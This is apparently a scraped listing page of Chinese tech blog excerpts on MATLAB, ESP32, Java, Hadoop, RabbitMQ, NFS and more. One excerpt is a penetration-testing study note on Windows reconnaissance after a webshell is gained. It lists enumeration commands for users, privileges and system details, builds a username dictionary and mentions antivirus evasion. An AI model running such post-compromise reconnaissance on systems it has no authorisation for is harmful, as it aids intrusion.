syms y(x); y=dsolve('D2y=sin(2*x)-y','y(0)=0,Dy(pi)=0','x'); plot(0:0.01:pi,subs(y,0:0.01:pi)); xlabel('x');ylabel('y');title('解析解') 结果如下：
二、微分方程数值解（ode45函数） 1.1例子1 从上面我们可以看到，教材把一个二阶微分方程降阶了，变成了两个微分方程。我们这里编的程序是根据我自己的习惯来的，和教程上不一样。
代码如下（示例）：
[t,x] = ode45(@model,[0:0.1:6],[0,1]); plot(t,x(:,1),t,x(:,2)); legend('y(x)','y\prime(x)') function dx = model(t,x) dx = zeros(2,1); dx(1) = x(2); dx(2) = 4*sin(8*t)-3*x(1); end 结果如下所示：
1.2 例子2 阿波罗卫星运动轨迹 同理，我们依然给他降降阶，变成下面：
代码如下（示例）：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b80e4aec4ab3f09644d67a25807c16ee/" rel="bookmark">
			Mac m1 安装janus
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		No package 'libssl' found
No package 'libcrypto' found
将/usr/local 改成/opt/homebrew
https://www.jianshu.com/p/feb08288c557
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d9226efba018b76a3fdb49942708103/" rel="bookmark">
			引航计划Day2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时间来到了引航计划的第二天，今天的任务是对昨天程序的复习以及组装小车。
在测试完电机、舵机都可以运行后，需要将舵机调为中位（占空比为7.5），在代码中我们将后三个动作注释掉即可：
#include "driver/mcpwm.h" esp_err_t esp_err; void setup() { Serial.begin(115200); // servo pwm config mcpwm_gpio_init(MCPWM_UNIT_1, MCPWM1A, 15); // mcpwm_config_t servo_pwm_config = { // .frequency = 50, // .cmpr_a = 0, // .duty_mode = MCPWM_DUTY_MODE_0, // .counter_mode = MCPWM_UP_COUNTER, // }; mcpwm_config_t servo_pwm_config; servo_pwm_config.frequency = 50; servo_pwm_config.cmpr_a = 0; servo_pwm_config.duty_mode = MCPWM_DUTY_MODE_0; servo_pwm_config.counter_mode = MCPWM_UP_COUNTER; esp_err = mcpwm_init(MCPWM_UNIT_1, MCPWM_TIMER_1, &amp;servo_pwm_config); if (esp_err == 0) Serial.println("Setting motor pwm success!"); else { Serial.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d9226efba018b76a3fdb49942708103/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca2e60852c1b2ad37812face7cbe6b21/" rel="bookmark">
			内网渗透学习-Windows信息收集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内网渗透学习-Windows信息收集 本章内容主要介绍在获取网站服务器webshell后，怎样对Windows主机进行信息收集，对其网络环境进行分析和利用，主要是一个思路整理，在后续的章节中会整理更详细的实践过程。
后渗透中最重要的环节就是信息收集。
收集思路 权限：
看哪些地方是有权限可以利用的 看有哪些进程看有几个用户查看敏感的配置文件 网络：
看路由看arp进程通信是否是k8s集群？虚拟集群(vcenter)？有的话找主控端 docker&amp;k8s技术扫盲(在此之前先理清虚拟机，容器，docker，Kubernetes集群，虚拟机的概念)是否站库分离？站库分离就要想办法渗透相应的数据库 站库分离渗透思路是否有堡垒机？ 杀软：
当前所控服务器有无杀软，杀软是什么类型，有针对性的做免杀处理 分析当前网络架构：
Windows系统：是工作组环境还是域环境Linux系统:判断是集群，私有云还是阿里云aws(可以利用vpc搭建私网)MAC系统：判断是工作站还是集群环境 另外关注机器有没有多网卡，后续可以跨网段渗透(OxidScan)
针对上述收集到的信息做针对性总结，搞清楚这台机子究竟是干什么的。
本文重点是针对Windows系统的信息收集，接下来作对两种不一样的网络架构环境下信息收集的总结
如何分析是域环境还是工作组环境？要做哪些信息收集？ 1.分析方法 systeminfo或者net config workstation(如果存在域那么就会显示工作站域和工作站域DNS等信息)
上述两条指令执行之后如果看到WORKGROUP
就可以判断是工作组环境了，反之出现xxx.com等就是域环境
2.信息收集方法 首先判断当前机器有什么用户，用户的拥有什么程度的权限，查看当前用户SID
whoami whoami /user whoami /user &amp;&amp; whoami /priv &amp;&amp; whoami /all　#查看主机权限(whoami /priv) 当前操作系统
wmic OS get Caption,CSDVersion,OSArchitecture,Version 英文版系统用这条命令： systeminfo | findstr /B /C:"OS Nmae" /C:"OS Version" 中文版用： systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本” 查看系统体系结构 echo %PROCESSOR_ARCHITECTURE% 查看主机用户，制作用户字典
net user
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca2e60852c1b2ad37812face7cbe6b21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def242976576575e61a3fc6955b8faa7/" rel="bookmark">
			MyBatisPuls 多数据源操作数据源偶尔报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天同事在开发一个项目的时候使用了 MybatisPlus 的多数据源, 但是在登陆的时候偶然就会报错 如下 说使用错库了
但是刷新几次有好了 我去看了看这个问题 我当时表示十分震惊 debug 了 一个多小时也没找到错误 正当我快放弃的时候 我想起了我以前排除过的一个问题 mybatis的 幽灵分页 (错误的使用分页插件 导致的ThreadLocal 重复使用的问题)
版本是
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;dynamic-datasource-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/dependency&gt; org.springframework.jdbc.BadSqlGrammarException: ### Error querying database. Cause: java.sql.SQLSyntaxErrorException: Table 'constdatacenterx_company.sys_dict_type' doesn't exist ### The error may exist in vip/xiaonuo/sys/modular/dict/mapper/SysDictTypeMapper.java (best guess) ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### SQL: SELECT id,name,code,sort,remark,status,create_time,create_user,update_time,update_user FROM sys_dict_type WHERE (status &lt;&gt; ?) ### Cause: java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/def242976576575e61a3fc6955b8faa7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96137dc0c6f0e2ef715e2f54b7b93ce4/" rel="bookmark">
			【jenkins&#43;jmeter&#43;pipeline】使用pipeline方式，分布式执行jmeter脚本，并生成报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、首先准备执行参数
threadsnum---当前并发数（如果是多台slave机运行，最终并发数需要乘以台数） duration---脚本执行持续时间，单位为秒 jmxname--jmx脚本存放路径 slave1Server---slave1的ip slave2Server---slave2的ip MasterServer--master的ip 二、脚本如下
pipeline { agent { label 'slave1' } environment{ #定义脚本文件名称 def ori_jmx_num_filename="/home/apache-jmeter-4.0/jmeterTest/thread_${threadsnum}_${duration}_${jmxname}" def jmx_num_filename="/home/apache-jmeter-4.0/jmeterTest/thread_${threadsnum}_${duration}_${jmxname}.jmx" #定义报告 def jtl_filename="/home/apache-jmeter-4.0/jmeterTest/jtl_${threadsnum}_${duration}_${jmxname}.jtl" def web_filename="/home/apache-jmeter-4.0/jmeterResult/web_${threadsnum}_${duration}_${jmxname}" def jmx_filepath="/home/apache-jmeter-4.0/jmeterTest/${jmxname}.jmx" } stages { stage('kill jmeter') { agent { label "${MasterServer}" } steps{ sh "if (ps -ef| grep java|grep ${jmxname})then (ps -ef| grep java|grep ${jmxname}| awk '{print \$2}'|xargs sudo kill -9) fi" sleep(2) } } #启动slave上的jmeter-server stage('start slave1') { agent { label "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96137dc0c6f0e2ef715e2f54b7b93ce4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64956a29806ad2e7a1928621ab2cbe45/" rel="bookmark">
			Collectors.toMap中value值为null导致空指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 测试发现有空指针异常，看日志那行只有一个lambda表达式list转map，一查才发现原来Collectors.toMap不允许value值为null，否则会报空指针异常。
查看源代码可以看到：
解决方法：
for循环 或 forEach Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); list.forEach((i) -&gt; map.put(i.getId(), i.getValue())); 使用stream的collect重载方法 Map&lt;String, String&gt; map = list.stream().collect(HashMap::new, (m,v)-&gt; m.put(v.getId(), v.getValue()),HashMap::putAll); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a9036829ba30d924cd7401b370deaaf/" rel="bookmark">
			System limit for number of file watchers reached, watch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 可以在linux 下修改文件监控数
sudo vi /etc/sysctl.conf # 在最后面加入 fs.inotify.max_user_watches=524288 # 保存后退出 # 之后运行命令 sudo sysctl -p 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8410abb6a44952e03f4db0155a4918c5/" rel="bookmark">
			Undefined symbols for architecture arm64解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在iOS开发中经常遇到的一个错误是Undefined symbols for architecture arm64，这个错误表示工程某些地方不支持arm64指令集。那我们应该怎么解决这个问题了?我们不仅要解决这个问题,更要了解出现这个问题的根源.这样根本上杜绝这类问题发生.
对于iOS设备来说iOS的指令集有armv6、armv7、armv7s、arm64这样四种，不同型号的iOS设备使用不同的指令集，下面是各自的区别：
armv6
iPhone、iPhone 3G
iPod 1G、iPod 2G
armv7
iPhone 3GS、iPhone 4
iPod 3G、iPod 4G、iPod 5G
iPad、iPad 2、iPad 3、iPad Mini
armv7s
iPhone 5、iPhone 5C
iPad 4
arm64
iPhone 5S iPhone 6 iPhone 6Plus
iPad Air, Retina iPad Mini
在Xcode的target-&gt;Build Settings中有一个Architectures的分组主要是用来设置Architectures方面的内容，下面重点介绍下面几个设置项的内容。 Architectures 该编译选项指定了工程将被编译成支持哪些指令集，支持指令集是通过编译生成对应的二进制数据包实现的，如果支持的指令集数目有多个，就会编译出包含多个指令集代码的数据包，造成最终编译的包很大。
官方文档说明：
Space-separated list of identifiers. Specifies the architectures (ABIs, processor models) to which the binary is targeted. When this build setting specifies more than one architecture, the generated binary may contain object code for each of the specified architectures.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8410abb6a44952e03f4db0155a4918c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/324947850c54fabc62852b48982336d3/" rel="bookmark">
			Android MVI架构解析以及与其他架构对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MVC MVC架构主要分为以下几部分：
1.View: 对应于xm布局文件和java代码动态view部分。
2.Controller: 主要负责业务逻辑，在android中由Activity承担，但xml视图能力太弱，所以Activity既要负责视图的显示又要加入控制逻辑，承担功能过多。
3.Model: 主要负责网络请求，数据库处理，I/O操作，即页面的数据来源。
如2所说，android中xml布局功能性太弱，activity实际上负责了View层与Controller层两者的功能，所以在android的mvc变成了这样：
MVP MVP主要分为以下几部分：
1.View层：对应于Activity与xml，只负责显示UI，只与Presenter层交互，与Model层没有耦合。
2.Presenter层：主要负责处理业务逻辑，通过接口回调View层。
3.Model层：主要负责网络请求，数据库处理的操作。
MVP解决了MVC的两个问题，即Activity承担了两层职责与View层和Model层耦合的问题。
MVP问题：
1.Presenter层通过接口与View通信，实际上持有了View的引用。
2.业务逻辑的增加，一个页面变得复杂，造成接口很庞大。
MVVM MVVM改动在于将Presenter改为ViewModel,主要分为以下几部分：
1.View: Activity和Xml,与其他的相同
2.Model: 负责管理业务数据逻辑，如网络请求，数据库处理，与MVP中Model相同
3.ViewModel:存储视图状态，负责处理表现逻辑，并将数据设置给可观察容器。
View和Presenter从双向依赖变成View可以向ViewModel发送指令，但ViewModel不会直接向View回调，而是让View通过观察者的模式去监听数据的改变，有效规避MVP双向依赖的缺点。
MVVM缺点：
多数据流：View与ViewModel的交互分散，缺少唯一修改源，不易于追踪。
LiveData膨胀：复杂的页面需要定义多个MutableLiveData，并且都需要暴露为不可变的LivewData。
DataBinding、ViewModel 和 LiveData 等组件是 Google 为了帮助我们实现 MVVM 模式提供的架构组件，它们并不是 MVVM 的本质，只是实现上的工具。
Lifecycle： 生命周期状态回调；LiveData： 可观察的数据存储类；databinding： 可以自动同步 UI 和 data，不用再 findviewById()；ViewModel： 存储界面相关的数据，这些数据不会在手机旋转等配置改变时丢失。 MVI mvi的改动在于将View和ViewModel之间的多数据流改为基于ViewState的单数据流，MVI分为四个部分：
View: Activity 和xml文件，与其他模式中的View的概念相同。Intent: 定义数据操作，将数据传到Model的唯一来源。ViewModel: 存储视图状态，负责处理表现逻辑，并将ViewState设置给可观察数据容器ViewState: 一个数据类，包含页面状态和对应的数据。 MVI特点 唯一可信源：数据只有一个来源（ViewModel）,与MVVM思想相同单向数据流：状态向下流动，事件向上流动。响应式：ViewState包含页面当前状态和数据，View通过订阅ViewState就可以完成页面刷新。相比于 MVVM 是新的特性。 // 单数据流： View 和 ViewModel 之间只有一个数据流，只有一个地方可以修改数据，确保数据是安全稳定的。并且 View 只需要订阅一个 ViewState 就可以获取所有状态和数据，相比 MVVM 是新的特性；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/324947850c54fabc62852b48982336d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78ee4f096e10e5f81ad71ab47b2aae63/" rel="bookmark">
			NameNode、SecondaryNameNode与DataNode工作机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NameNode与SecondaryNameNode工作机制 第一阶段：NameNode启动 （1）第一次启动NameNode格式化后，创建Fsimage和Edits文件。如果不是第一次启动，直接加载编辑日志和镜像文件到内存。
（2）客户端对元数据进行增删改查的请求。
（3）NameNode记录操作日期，更新滚动日志（edits文件）
（4）NameNode在内存中对元数据进行增删改，并将元数据保存到镜像文件（fsimage）
注意：如果edits中的数据满了一百万条，则进行合并，NameNode会生成新的edits文件，并且将原来的edits文件改名，然后将edits文件和fsimage文件发送给SecondaryNameNode进行合并操作，SecondaryNameNode将生成新的fsimage文件，并发送给NameNode。
第二阶段：SecondaryNameNode工作 （1）SecondaryNameNode询问NameNode是否需要CheckPoint。直接带回NameNode是否检查结果。
（2）SecondaryNameNode请求执行CheckPoint。
（3）NameNode滚动正在写的edits日志。
（4）将滚动前的编辑日志和镜像文件拷贝到SecondaryNameNode。
（5）SecondaryNameNode加载编辑日志和镜像文件到内存，并合并。
（6）生成新的镜像文件fsimage.chkpoint.
（7）拷贝fsimage.chkpoint到NameNode。
（8）NameNode将fsimage.chkpoint重新命名成fsimage。
CheckPoint时间设置 1）通常情况下，SecondaryNameNode每隔一下执行一次。
hdfs-default.xml
&lt;property&gt; &lt;naem&gt;dfs.namenode.checkpoint.period&lt;/name&gt; &lt;value&gt;360s&lt;/value&gt; &lt;/property&gt; 2）一分钟检查一次操作次数，当操作次数达到1百万时，SecondaryNameNode执行一次合并。
&lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.txns&lt;/name&gt; &lt;value&gt;1000000&lt;/name&gt; &lt;description&gt;操作动作次数&lt;/desciption&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.check.period&lt;/name&gt; &lt;value&gt;60s&lt;/name&gt; &lt;description&gt;1分钟检查一次操作次数&lt;/desciption&gt; &lt;/property&gt; DataNode工作机制 （1）一个数据块在DataNode上以文件形式存储在磁盘上，包括两个文件，一个是数据本身，一个是元数据包括数据块的长度，块数据的校验和，以及时间戳。
（2）DataNode启动后向NameNode注册，通过后，周期性（6小时）的向NameNode上报所有的块信息。
DN向NN汇报当前解读信息的时间间隔，默认6小时：
&lt;property&gt; &lt;name&gt;dfs.blockreport.intervalMsec&lt;/name&gt; &lt;value&gt;21600000&lt;/value&gt; &lt;description&gt;Determines block reporting interval in milliseconds.&lt;/description&gt; &lt;/property&gt; （3）心跳是每3秒一次，心跳返回结果带有NameNode给该DataNode的命令如复制块数据到另一个机器，或删除某个数据块。如果超过10分钟没有收到某个DataNode的心跳，则认为该节点不可用。
（4）集群运行中可以安全加入和退出一些机器。
DataNode节点保证数据完成性的方法： （1）当DataNode读取Block的时候，它会计算CheckSum。
（2）如果计算后的CheckSum，与Block创建时不一样，说明Block已经损坏。
（3）Client读取其他DataNode上的Block。
（4）常见的校验算法crc（32），md5（128），shal（160）
（5）DataNode在其文件创建后周期验证CheckSum。
DataNode掉线实现参数设置 （1）DataNode进程死亡或者网络故障造成DataNode无法与NameNode通信。
（2）NameNode不会立即把该节点判定为死亡，要经过一段时间，这段时间暂称作超时时长。
（3）HDFS默认的超时时长为10分钟+30秒。
（4）如果定义超时时间为TimeOut，则超时时长的计算公式为：
TimeOut = 2* dfs.namenode.heartbeat.recheck-interval + 10 * dfs.heartbeat.interval。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78ee4f096e10e5f81ad71ab47b2aae63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0866383675627ec181e427eb32152c0/" rel="bookmark">
			100行python代码实现细胞自动机（康威生命游戏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		英国数学家约翰·何顿·康威在1970年发明了细胞自动机，它属于一种仿真程序，通过设定一些基本的规则来模拟和显示的图像的自我进化，看起来颇似生命的出生和繁衍过程，故称为“生命游戏”。
完成效果 用到的第三方库 pygame
基本规则 康威生命游戏在网格上进行，有填充的网格代表有生命，或理解成一个细胞，游戏规则只有四条：
1 当周围仅有1个或没有存活细胞时， 原来的存活细胞进入死亡状态。（细胞过于稀少）
2 当周围有2个或3个存活细胞时， 网格保持原样。
3 当周围有4个及以上存活细胞时，原来的存活细胞亦进入死亡状态。（细胞过于拥挤）
4 当周围有3个存活细胞时，空白网格变成存活细胞。（繁殖新细胞）
代码实现 首先定义两个常量，来代表一个细胞（网格）的生或空白的状态：
ALIVE = (124, 252, 0) # 绿色 EMPTY = (0, 0, 0) # 黑色 我这里取了个巧，直接用RGB颜色来表示细胞生存或者死亡这两种状态，因为在后面的pygame的展示中，ALIVE的细胞用绿色表示，EMPTY的区域用黑色表示。
下面几个变量是pygame里用到的参数，分别是屏幕的尺寸，x和y方向的网格数量，还有单个细胞的尺寸：
SCREEN_WIDHT = 600 SCREEN_HEIGHT = 600 X = 100 # X方向的网格数量 Y = 100 # Y方向的网格数量 CELL_WIDTH = SCREEN_WIDHT / X CELL_HEIGHT = SCREEN_HEIGHT / Y 现在来定义一个细胞，也就是一个网格：
import pygame from pygame.locals import * class Cell: '''单个细胞''' def __init__(self, x, y): self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0866383675627ec181e427eb32152c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68d105c38e81b6b10b79cce8af4bb838/" rel="bookmark">
			RabbitMQ工作模式3-Pub/Sub 订阅模式 RabbitMQ工作模式4-Routing 路由模式 RabbitMQ工作模式5-Topics 通配符模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.Pub/Sub 订阅模式 1.模式说明 2.生产者代码 交换机用的是广播：所以路由键为" "
package com.cd; import com.rabbitmq.client.BuiltinExchangeType; import com.rabbitmq.client.Channel; import com.rabbitmq.client.Connection; import com.rabbitmq.client.ConnectionFactory; import java.io.IOException; import java.util.concurrent.TimeoutException; public class Producer_PubSub { public static void main(String[] args) throws IOException, TimeoutException { //六模式——简单模式 //创建连接工厂 ConnectionFactory factory = new ConnectionFactory(); //设置参数 factory.setHost("10.10.26.129");//虚拟机上的ip:Rabbitmq我的安装在虚拟机上 默认值：localhost factory.setPort(5672); //设置端口 默认值：5672 factory.setVirtualHost("/"); //虚拟机 默认值：/ factory.setUsername("guest"); //用户名 默认值：guest factory.setPassword("guest"); //密码 默认值：guest //创建连接 Connection connection = factory.newConnection(); //创建Channel Channel channel = connection.createChannel(); //创建交换机 /* *exchangeDeclare(String exchange, BuiltinExchangeType type, boolean durable, boolean autoDelete, boolean internal, Map&lt;String, Object&gt; arguments) * 参数： * 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68d105c38e81b6b10b79cce8af4bb838/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c4448b17cae143743f1d6798226c9ae/" rel="bookmark">
			微信小程序 input绑定async函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在调用bind的过程中本身不会执行函数，会返回函数 ，在调用call过程中函数本身会执行 handleInputNum(e) { const key = e.currentTarget.dataset.key; const val = e.detail.value; this.setData({ [key]: val }) handleInputNumApi.call(this); async function handleInputNumApi() { await this.getExpectCost(); } }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c94fc2e8a15091bd0c5874dba9bde0dd/" rel="bookmark">
			零束科技获得中国信通院“2022 XOps产业生态峰会优秀案例”奖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近日，在中国信息通信研究院主办的“2022首届XOps产业生态峰会”上，“零束科技DevSecOps研运一体化平台建设项目”荣获“研运质效典范标杆案例”奖项，这是车联网软件行业唯一获奖的案例，为更多企业的研发运营一体化、数字化发展提供了有益参考。
统筹管理，提升效率
XOps产业生态峰会以“智效赋能·价值引领，共筑XOps新蓝图”为主题，旨在提高企业研发运营能力水平，加强XOps体系建设经验交流分享。经过会前多轮技术评估和行业专家审议，零束科技凭借领先的技术创新能力和行业落地经验，最终荣获“研运质效典范标杆案例”奖项。
零束科技DevSecOps研运一体化平台以车云两端的产品和服务为导向，建立研发-测试-运维各级组织的松耦合架构，通过独立研发、测试和部署，快速完成原本由专业团队完成的工作，积极推动组织高效运作与产品迭代。平台实现了应用从需求、开发、测试、部署、运维及运营的全流程全生命周期统筹管理，缩短云端研发迭代周期，提升软件产品交付质量及开发效率，提高了信息技术对车端业务需求的响应速度，同时，为零束云端业务系统快速交付提供了源动力，赋能零束研发数字化体系建设。
目前，零束科技DevSecOps研运一体化平台已取得如下阶段性成果：
敏捷管理
线下Excel表格转线上CTeam，沟通效率提升15%以上；需求矩阵全生命周期可视化展示，高效协作保障价值交付。
持续交付
完成686条流水线的适配优化，发布时长较人工部署平均缩短30min以上，月度总构建数达4000+，产品迭代上线频率提升60%。
质量保证
创建规则3000+，崩溃率降低到0.1%，实现软件研发端到端的工具链贯通，打造一站式、一体化平台，提升研效10%。
流程融合
软件交付全流程标准化，重点对需求、开发、测试3大流程进行优化，所有规范、规则、工艺等都在平台上以一定的规则配置固化，实现了落地执行不走样。
在市场业务需求和行业技术创新两方面共同驱动下，企业研发运营转型成为大势所趋，运营体系正在向多元化方向发展，DevOps已成为不可或缺的软件开发方法。未来，零束科技将继续加强自身基础技术能力建设，不断探索更多人工智能（AI）和机器学习（ML）驱动的DevOps方法、BizDevOps、FinOps、AgileOps等，打通企业数字化转型的全链路场景，更快地响应客户需求和市场变化、带动行业高质量发展，为产业数字化发展注入新动能。
关于零束科技
零束科技致力于智能车技术底座和产品研发，以灵活开放的合作模式，为客户提供全栈或平台解决方案，共创共享新价值。零束科技成立两年来，快速聚集了1600多名汽车智能化高科技人才，打造并量产了汽车行业首个全栈技术解决方案：零束银河全栈4+1。零束科技始终坚持打造高质量管理体系和敏捷的研发体系（已通过ISO9001、ASPICE CL2、ISO26262等认证)，持续为客户提供值得信赖的系统和产品解决方案，加快产品服务的平台化、市场化和规模化发展，构建更加开放的汽车产业新生态，引领“软件定义汽车”发展新浪潮，成为智能车时代的领跑者。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5f15a980a6a6f7182f0563dcb1ae35d/" rel="bookmark">
			大屏可视化插件网址笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Echarts
echarts
https://echarts.apache.org/zh/index.html
2、DataV
DataV
http://datav.jiaminghi.com/
3、PPChart（echarts示例）
PPChart
http://www.ppchart.com/#/
4、isqqw（echarts示例）
isqqw.com
5、阿里云地图数据
地图数据
6、http://chartsdev.com/
http://chartsdev.com/
7、https://madeapie.com/#/
madeapie
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cec51067839d058f4a7ba4ac756aaf0/" rel="bookmark">
			21天经典算法-直接插入排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​
​
活动地址：CSDN21天学习挑战赛
直接插入排序是什么？ 直接插入排序是一种最简单的排序方法，过程就是将每个待排元素逐个插入到已经排好的有序序列中。
描述 输入：n个数的序列，通常直接存放在数组中，可能是任何顺序。
输出：输入序列的一个新排列，满足从小到大的顺序（默认讨论升序，简单的修改就可以实现降序排列）。
算法说明 每次从原有数据中取出一个数，插入到之前已经排好的序列中，直到所有的数全部取完，那么新的有序排列也就完成了。
通俗一点的解释就是好比我们在打扑克抓牌，所有的牌扣在桌面上，我们一张一张的抓，抓起一张就在手里把它排好。那么等我们把所有的牌都抓起来之后，手里的牌也都是有序的了。
实现（使用python实现） li=[11,34,20,10,12,35,41,32,43,14]; # 数组下标从0开始，j初始为1，指向第二个元素 for j in range(1,len(li)): key=li[j] # 初始化i，为j的前一个元素 i = j - 1 # while循环作用：在已经排好的有序数列中确定key的位置，并串出对应的位置 while i&gt;=0 and li[i]&gt;key: # 串位覆盖，不需要使用交换，值已经被记录在key中 li[i + 1] = li[i]; # 逐渐前移 i = i - 1; # 将待排元素放在对应的位置 li[i + 1] = key; 输出 ​[10,11,12,14,,20,32,34,35,41,43]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93173e31f24bec7bbbb1aa216c89f88c/" rel="bookmark">
			【ubuntu】nfs服务搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、开篇 在嵌入式linux开发过程中，由于目标平台的资源限制，开发环境一般都不会放到目标板卡上（需要放在开发宿主机上），如果需要宿主机与目标板卡之间进行文件传输，该怎么办呢。这时候nfs就派生用场了。nfs（Network File System）是一个网络文件系统。使用该文件系统，便能在目标板卡上访问开发宿主机上的文件，还能进行互相拷贝和移动，非常方便。
本文主要描述nfs的搭建方式，由于不同环境和系统下，nfs服务搭建方式可能不同，故将环境描述如下：
【环境描述】
选择虚拟机ubuntu 18.04作为主机。
硬件平台为一块搭载瑞芯微rk3568处理器的板卡。软件方案：linux平台
通信方式：路由器（开启了DHCP） + 网线
二、搭建nfs服务 （2-1）下载nfs服务软件包 首先，在终端使用下列命令安装nfs:
sudo apt-get install nfs-kernel-server （注：由于笔者已经安装过了，故没有新安装软件包）
（2-2）配置nfs 使用以下命令：
gedit /etc/exports 在文件最后一行添加如下内容：/home/nfs/ *(rw,sync,no_root_squash)
完成后如下图所示：
/home/nfs/：指示要共享的目录；“/home/nfs/ ”目录需要自己创建。
*：代表允许所有的网络段访问。
rw：指示具有可读写的权限。
sync：指示资料同步写入内存和硬盘
no_root_squash：是 Ubuntu nfs 客户端分享目录使用者的权限。例如：如果客户端使用的是 root 用户，那么对于该共享目录而言，该客户端就具有 root 权限。
（2-3）启动rpcbind服务 使用以下命令重新启动rpcbind服务：
/etc/init.d/rpcbind restart （2-4）启动nfs服务 使用以下命令重新启动nfs服务：
/etc/init.d/nfs-kernel-server restart （2-5）验证nfs 使用以下命令：
showmount -e 可以查看系统是否成功挂载nfs目录。
（注：如果没有输出，可能需要重新启动ubuntu后，再使用该条命令查看！！！）
在上图中，看到了输出信息为：/home/nfs *，则证明nfs已经启动成功。
至此，虚拟机ubuntu上的nfs服务就搭建好了。接下来，就需要在硬件板卡上挂载nfs文件系统了。
三、硬件板卡端接入nfs服务 在接入之前，需要获取ubuntu和硬件板卡的ip地址：
回到硬件板卡的终端中：
查看硬件板卡的ip地址： （注：硬件板卡有两个网口且网线连接的是eth1）
回到虚拟机ubuntu中：
查看虚拟机ubuntu的ip地址： 在硬件板卡linux命令行终端下使用以下命令：
mount -t nfs -o nfsvers=3,nolock 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93173e31f24bec7bbbb1aa216c89f88c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/045b77c5871102d5563744f3496f2010/" rel="bookmark">
			【深度学习】基于tensorflow的服装图像分类训练（数据集：Fashion-MNIST）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​
活动地址：CSDN21天学习挑战赛
目录 前言了解Fashion-MNIST数据集下载数据集使用tensorflow下载（推荐）数据集分类数据集格式 采用CPU训练还是GPU训练区别使用CPU训练使用GPU训练 预处理最值归一化（normalization）升级图片维度 显示部分图片建立CNN模型网络结构参数量 训练模型模型评估 前言 关于环境这里不再赘述，与【深度学习】从LeNet-5识别手写数字入门深度学习一文的环境一致。
